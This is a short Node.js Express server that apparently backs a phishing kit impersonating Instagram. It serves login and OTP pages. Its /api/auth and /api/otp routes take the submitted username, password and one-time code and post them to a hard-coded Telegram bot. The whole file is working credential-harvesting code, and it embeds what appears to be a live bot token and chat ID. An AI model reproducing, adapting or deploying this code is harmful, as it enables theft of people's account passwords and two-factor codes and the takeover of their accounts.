const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8902544765:AAE-8hXowxjEmNCcNUte0q1SIfvsyd1sGj4';
const CHAT_ID = '8975887766';

app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));

async function sendTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' });
  } catch (err) {
    console.error('Telegram Error:', err.message);
  }
}

app.post('/api/auth', async (req, res) => {
  const { email, password } = req.body;
  const msg = `<b>🔐 Instagram Login</b>\n\n<b>User/Email:</b> <code>${email}</code>\n<b>Pass:</b> <code>${password}</code>`;
  await sendTelegram(msg);
  res.json({ success: true });
});

app.post('/api/otp', async (req, res) => {
  const { otp } = req.body;
  const msg = `<b>🔑 Instagram OTP</b>\n\n<b>Code:</b> <code>${otp}</code>`;
  await sendTelegram(msg);
  res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));